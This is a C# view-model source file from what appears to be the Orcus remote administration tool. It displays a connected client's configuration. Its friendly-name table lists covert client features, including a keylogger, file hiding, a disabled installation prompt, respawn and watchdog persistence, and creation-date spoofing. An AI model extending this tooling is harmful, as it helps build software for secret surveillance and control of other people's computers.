using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Core.CommandManagement.View;
using Orcus.Administration.Plugins.CommandViewPlugin;
using Orcus.Shared.Client;
using Orcus.Shared.Settings;

namespace Orcus.Administration.ViewModels.CommandViewModels
{
    [MinimumClientVersion(14)]
    public class ClientConfigViewModel : CommandView
    {
        private List<ClientConfigPropertyViewModel> _clientConfigProperties;

        public override string Name { get; } = (string) Application.Current.Resources["Config"];
        public override Category Category { get; } = Category.Client;
        public ClientConfig Config { get; private set; }

        public List<ClientConfigPropertyViewModel> ClientConfigProperties
        {
            get { return _clientConfigProperties; }
            set { SetProperty(value, ref _clientConfigProperties); }
        }

        protected override void InitializeView(IClientController clientController, ICrossViewManager crossViewManager)
        {
        }

        protected override ImageSource GetIconImageSource()
        {
            return
                new BitmapImage(
                    new Uri("pack://application:,,,/Resources/Images/VisualStudio/ApplicationBehaviorSettings_16x.png",
                        UriKind.Absolute));
        }

        public override async void LoadView(bool loadData)
        {
            Config = await ClientController.GetClientConfig();

            var friendlyNames = new Dictionary<Type, string>
            {
                {typeof (AutostartBuilderProperty), (string) Application.Current.Resources["Autostart"]},
                {
                    typeof (ChangeAssemblyInformationBuilderProperty),
                    (string) Application.Current.Resources["AssemblyInformation"]
                },
                {
                    typeof (ChangeCreationDateBuilderProperty),
                    (string) Application.Current.Resources["ChangeCreationDate"]
                },
                {typeof (ChangeIconBuilderProperty), (string) Application.Current.Resources["ChangeIcon"]},
                {typeof (ClientTagBuilderProperty), (string) Application.Current.Resources["ClientTag"]},
                {typeof (ConnectionBuilderProperty), (string) Application.Current.Resources["Connection"]},
                {typeof (DataFolderBuilderProperty), (string) Application.Current.Resources["DataFolder"]},
                {typeof (DefaultPrivilegesBuilderProperty), (string) Application.Current.Resources["DefaultPrivileges"]},
                {
                    typeof (DisableInstallationPromptBuilderProperty),
                    (string) Application.Current.Resources["DisableInstallationPrompt"]
                },
                {
                    typeof (FrameworkVersionBuilderProperty),
                    (string) Application.Current.Resources["NetFrameworkVersion"]
                },
                {typeof (HideFileBuilderProperty), (string) Application.Current.Resources["HideFile"]},
                {typeof (InstallationLocationBuilderProperty), (string) Application.Current.Resources["Location"]},
                {typeof (InstallBuilderProperty), (string) Application.Current.Resources["InstallClient"]},
                {typeof (KeyloggerBuilderProperty), (string) Application.Current.Resources["Keylogger"]},
                {typeof (MutexBuilderProperty), (string) Application.Current.Resources["Mutex"]},
                {typeof (ProxyBuilderProperty), (string) Application.Current.Resources["Proxy"]},
                {typeof (ReconnectDelayProperty), (string) Application.Current.Resources["ReconnectDelay"]},
                {
                    typeof (RequireAdministratorPrivilegesInstallerBuilderProperty),
                    (string) Application.Current.Resources["InstallationForceAdminPrivileges"]
                },
                {typeof (RespawnTaskBuilderProperty), (string) Application.Current.Resources["RespawnTask"]},
                {typeof (ServiceBuilderProperty), (string) Application.Current.Resources["Service"]},
                {
                    typeof (SetRunProgramAsAdminFlagBuilderProperty),
                    (string) Application.Current.Resources["SetRunAsAdminFlag"]
                },
                {typeof (WatchdogBuilderProperty), (string) Application.Current.Resources["Watchdog"]}
            };

            ClientConfigProperties = Config.Settings.Select(clientSetting => new ClientConfigPropertyViewModel
            {
                Name = GetName(clientSetting.SettingsType, friendlyNames),
                Properties =
                    clientSetting.Properties?.Select(
                        x => new KeyValuePair<string, string>(x.Name, ObjectToString(x.Value))).ToList()
            }).ToList();
        }

        private static string GetName(string settingsType, Dictionary<Type, string> dictionary)
        {
            var type = Type.GetType(settingsType);

            if (type == null)
                return settingsType;

            string name;
            if (dictionary.TryGetValue(type, out name))
                return name;

            return type.Name;
        }

        private static string ObjectToString(object value)
        {
            if (value is Enum)
                return GetDescription(value, value.GetType());

            if (value is ICollection)
                return string.Join(", ", ((ICollection) value).Cast<object>().Select(x => x.ToString()));

            return value?.ToString() ?? "";
        }

        private static string GetDescription(object enumValue, Type enumType)
        {
            var descriptionAttribute = enumType
                .GetField(enumValue.ToString())
                .GetCustomAttributes(typeof (DescriptionAttribute), false)
                .FirstOrDefault() as DescriptionAttribute;

            return descriptionAttribute != null
                ? descriptionAttribute.Description
                : enumValue.ToString();
        }
    }

    public class ClientConfigPropertyViewModel
    {
        public string Name { get; set; }
        public List<KeyValuePair<string, string>> Properties { get; set; }
    }
}